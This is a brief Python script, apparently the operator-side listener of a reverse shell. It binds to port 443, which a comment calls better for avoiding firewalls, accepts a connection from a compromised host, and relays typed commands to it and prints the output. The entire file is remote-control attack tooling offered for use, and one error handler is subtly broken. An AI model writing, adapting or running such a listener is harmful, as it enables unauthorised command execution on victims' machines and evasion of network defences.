import socket
import sys

def send_commands(s, conn):
    print("\nCtrl + C to kill the connection.")
    print("#>: ", end="")
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(4096) # 4096 is better for heavy transfers!
                print(data.decode("utf-8"), end="")
        except KeyboardInterrupt:
            conn.close()
            sys.exit()
        except Exception as e:
            print(e)
            conn.close()
            e.close()
            sys.exit()

def server(address):
    try:
        s = socket.socket()
        s.bind(address)
        s.listen()
        print("Server Initialized. I'm listening...")
    except Exception as e:
        print("\nIt seems like something went wrong.")
        
        restart = input("\nDo you want me to reinitialize the server? y/n ")
        if restart.lower() == "y" or restart.lower() == "yes":
            print("\nRoger That. Reinitializing the server...\n")
            server(address)
        else:
            sys.exit()
    conn, client_addr = s.accept()
    print(f"Connection Established: {client_addr}")
    send_commands(s, conn)

if __name__ == "__main__":
    host = "IP_ADDRESS_HERE"
    port = 443 # Better for avoiding firewall
    server((host, port))